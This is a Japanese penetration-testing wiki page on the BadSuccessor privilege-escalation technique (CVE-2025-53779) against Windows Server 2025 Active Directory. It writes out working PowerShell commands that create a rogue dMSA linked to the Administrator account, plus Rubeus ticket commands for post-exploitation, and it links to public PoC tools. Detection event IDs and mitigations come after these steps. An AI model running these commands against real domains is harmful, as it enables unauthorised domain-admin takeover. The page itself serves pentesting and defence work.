# BadSuccessor: 委任された MSA 移行の悪用による権限昇格

{{#include ../../banners/hacktricks-training.md}}

## 概要

委任された Managed Service Account（**dMSA**）は、Windows Server 2025 に搭載された **gMSA** の次世代後継です。正規の移行ワークフローでは、管理者が*古い*アカウント（ユーザー、コンピューター、またはサービスアカウント）を dMSA に置き換え、権限を透過的に引き継ぐことができます。このワークフローは、`Start-ADServiceAccountMigration` や `Complete-ADServiceAccountMigration` などの PowerShell cmdlet を通じて実行され、**dMSA オブジェクト**の 2 つの LDAP 属性に依存します。

* **`msDS-ManagedAccountPrecededByLink`** – 置き換えられる（古い）アカウントへの *DN リンク*。
* **`msDS-DelegatedMSAState`**       – 移行状態（`0` = なし、`1` = 進行中、`2` = *完了*）。<sup>[[1]](#references)</sup>

攻撃者が OU 内に**任意の** dMSA を作成し、これら 2 つの属性を直接操作できる場合、LSASS と KDC は dMSA をリンク先アカウントの*後継*として扱います。その後、攻撃者が dMSA として認証すると、**リンク先アカウントのすべての権限を継承します**。Administrator アカウントをリンクした場合は、**Domain Admin** まで昇格できます。<sup>[[1]](#references)</sup>

この手法は、2025 年に Unit 42 が **BadSuccessor** と命名しました。Microsoft は後に **CVE-2025-53779** を割り当て、**2025 年 8 月**にセキュリティ更新プログラムをリリースしました。この手法は、パッチ未適用の Windows Server 2025 環境や、危険な OU 委任の調査において、依然として重要です。<sup>[[1]](#references)[[2]](#references)[[6]](#references)</sup>

パッチ適用済み DC でも、攻撃者がターゲットアカウントの移行属性も書き込める場合、[両側 dMSA 移行](acl-persistence-abuse/BadSuccessor.md#bettersuccessor-after-the-kdc-patch)によってターゲットアカウントが露出する可能性があります。これは、任意のターゲットを狙える元の攻撃よりも条件が限定されます。

### 攻撃の前提条件

1. **組織単位（OU）**内にオブジェクトを作成することが*許可されている*アカウントで、次の少なくとも 1 つを有していること。
   * `Create Child` → **`msDS-DelegatedManagedServiceAccount`** オブジェクトクラス
   * `Create Child` → **`All Objects`**（汎用の作成権限）
2. LDAP および Kerberos へのネットワーク接続（標準的なドメイン参加環境／リモート攻撃）。<sup>[[1]](#references)</sup>

## 脆弱な OU の列挙

Unit 42 は、各 OU のセキュリティ記述子を解析し、必要な ACE を特定する PowerShell ヘルパースクリプトを公開しました。<sup>[[1]](#references)</sup>

```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```

内部では、scriptは `(objectClass=organizationalUnit)` を対象にページングLDAP検索を実行し、各 `nTSecurityDescriptor` で以下を確認します。

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (object class *msDS-DelegatedManagedServiceAccount*)

## Exploitation Steps

書き込み可能なOUが特定されれば、この攻撃はLDAPへの書き込み3回だけで実行できます。<sup>[[1]](#references)</sup>

```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
                     -DNSHostName host.contoso.local \
                     -Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
    @{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```

レプリケーション後、攻撃者は `attacker_dMSA$` として単純に **logon** するか、Kerberos TGT を要求できます。Windows は *置き換えられた* アカウントのトークンを構築します。<sup>[[1]](#references)</sup>

### 自動化

パスワードの取得やチケット管理を含むワークフロー全体を実行する、公開されている PoC がいくつかあります。

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)<sup>[[3]](#references)</sup>
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)<sup>[[4]](#references)</sup>
* NetExec module – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)<sup>[[5]](#references)</sup>

### Post-Exploitation

```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```

## 検出とハンティング

OU で **Object Auditing** を有効にし、以下の Windows Security Events を監視します:<sup>[[1]](#references)[[2]](#references)</sup>

* **5137** – **dMSA** オブジェクトの作成
* **5136** – **`msDS-ManagedAccountPrecededByLink`** の変更
* **4662** – 特定の属性の変更
  * GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
  * GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – dMSA に対する TGT の発行

`4662`（属性の変更）、`4741`（コンピューター／サービスアカウントの作成）、`4624`（その後のログオン）を相関させることで、BadSuccessor の活動をすばやく検出できます。**XSIAM** などの XDR ソリューションには、すぐに使えるクエリが用意されています（参考資料を参照）。<sup>[[2]](#references)</sup>

## 緩和策

* **CVE-2025-53779** に対する Microsoft のセキュリティ更新プログラムを適用し、すべての Windows Server 2025 ドメインコントローラーのパッチレベルを確認します。<sup>[[6]](#references)</sup>
* **最小権限の原則**を適用し、信頼できるロールのみに *Service Account* の管理を委任します。
* 明示的に必要としない OU から `Create Child` / `msDS-DelegatedManagedServiceAccount` を削除します。
* 上記のイベント ID を監視し、*Tier 0 以外*の ID による dMSA の作成または編集を検知したらアラートを発報します。

## 関連項目


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [BadSuccessor: dMSA を悪用した Active Directory の権限昇格 – Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [2] [Unit42 – 正当なアカウントが悪用されるとき: Delegated Managed Service Accounts の悪用](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [3] [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [4] [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [5] [NetExec BadSuccessor モジュール](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)
- [6] [Microsoft Security Response Center – CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
{{#include ../../banners/hacktricks-training.md}}
